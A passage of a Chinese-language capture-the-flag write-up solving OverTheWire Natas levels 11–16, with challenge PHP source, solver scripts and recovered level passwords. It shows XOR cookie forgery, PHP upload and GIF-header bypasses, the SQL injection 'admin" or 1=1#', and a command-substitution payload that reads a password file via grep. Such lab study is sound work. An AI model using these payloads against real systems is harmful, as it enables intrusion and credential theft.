<span class="token variable">$ciphertext</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$plaintext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">.=</span> <span class="token variable">$plaintext</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$ciphertext</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
#eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe</code></pre>

<p>因为key是循环使用的，测试发现key是<code>eDWoeDWoe</code></p>
<p>然后构造新的cookie</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">xor_encrypt</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token variable">$in</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">%</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"eDWoeDWo"</span><span class="token punctuation">;</span>
<span class="token variable">$newdata</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"showpassword"</span><span class="token operator">=></span><span class="token string double-quoted-string">"yes"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"bgcolor"</span><span class="token operator">=></span><span class="token string double-quoted-string">"#ffffff"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$plaintext</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$newdata</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ciphertext</span> <span class="token operator">=</span> <span class="token function">xor_encrypt</span><span class="token punctuation">(</span><span class="token variable">$plaintext</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$ciphertext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
#HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814095224527.png" alt="image-20250814095224527" loading="lazy"></p>
<pre class="language-none"><code class="language-none">The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB</code></pre>

<h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814095311397.png" alt="image-20250814095311397" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">genRandomString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token variable">$characters</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">;</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$p</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$string</span> <span class="token operator">.=</span> <span class="token variable">$characters</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$characters</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">makeRandomPath</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token variable">$ext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">genRandomString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">makeRandomPathFromFilename</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token variable">$fn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">makeRandomPath</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token function">makeRandomPathFromFilename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File is too big"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The file &lt;a href=\"<span class="token interpolation"><span class="token variable">$target_path</span></span>\"><span class="token interpolation"><span class="token variable">$target_path</span></span>&lt;/a> has been uploaded"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"There was an error uploading the file, please try again!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814100037652.png" alt="image-20250814100037652" loading="lazy"></p>
<p>直接伪造filename就能生成php扩展名的文件</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814100135518.png" alt="image-20250814100135518" loading="lazy"></p>
<pre class="language-none"><code class="language-none">trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC</code></pre>

<h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">genRandomString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token variable">$characters</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">;</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$p</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$string</span> <span class="token operator">.=</span> <span class="token variable">$characters</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$characters</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">makeRandomPath</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token variable">$ext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">genRandomString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">makeRandomPathFromFilename</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token variable">$fn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">makeRandomPath</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token function">makeRandomPathFromFilename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$err</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$err</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$err</span> <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The uploaded file exceeds MAX_FILE_SIZE"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Something went wrong :/"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File is too big"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File is not an image"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The file &lt;a href=\"<span class="token interpolation"><span class="token variable">$target_path</span></span>\"><span class="token interpolation"><span class="token variable">$target_path</span></span>&lt;/a> has been uploaded"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"There was an error uploading the file, please try again!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814100808267.png" alt="image-20250814100808267" loading="lazy"></p>
<p>加个GIF头即可</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814100844312.png" alt="image-20250814100844312" loading="lazy"></p>
<pre class="language-none"><code class="language-none">z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ </code></pre>

<h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814100926303.png" alt="image-20250814100926303" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'natas14'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;censored>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'natas14'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * from users where username=\""</span><span class="token operator">.</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\" and password=\""</span><span class="token operator">.</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"debug"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Executing query: <span class="token interpolation"><span class="token variable">$query</span></span>&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Successful login! The password for natas15 is &lt;censored>&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Access denied!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>没有waf的sql注入</p>
<pre class="language-none"><code class="language-none">admin&quot; or 1&#x3D;1#</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814101331613.png" alt="image-20250814101331613" loading="lazy"></p>
<pre class="language-none"><code class="language-none">Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx</code></pre>

<h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814101411711.png" alt="image-20250814101411711" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'natas15'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;censored>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'natas15'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * from users where username=\""</span><span class="token operator">.</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"debug"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Executing query: <span class="token interpolation"><span class="token variable">$query</span></span>&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"This user exists.&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"This user doesn't exist.&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error in query.&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>打盲注，直接sqlmap</p>
<p>得到</p>
<pre class="language-none"><code class="language-none">hPkjKYviLQctEW33QmuXL6eDVfMW4sGo</code></pre>

<h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250814102715765.png" alt="image-20250814102715765" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"needle"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"needle"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[;|&amp;`\'"]/'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"Input contains an illegal character!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"grep -i \"<span class="token interpolation"><span class="token variable">$key</span></span>\" dictionary.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>依然grep，内嵌一层grep</p>
<p>比如说</p>
<pre class="language-none"><code class="language-none">grep -i &quot;$(grep ^a &#x2F;etc&#x2F;natas_webpass&#x2F;natas17)&quot; dictionary.txt</code></pre>

<p>如果natas17的密码开头是a则返回其密码，但是字典里面没有他的密码，所以返回空</p>
<p>反之如果开头不是a，则中间grep查询为空，会返回整个dictionary.txt</p>
<p>脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url <span class="token operator">=</span> <span class="token string">"http://natas16.natas.labs.overthewire.org/"</span>
auth <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"natas16"</span><span class="token punctuation">,</span> <span class="token string">"hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"</span><span class="token punctuation">)</span>  <span class="token comment"># 你的账户密码</span>
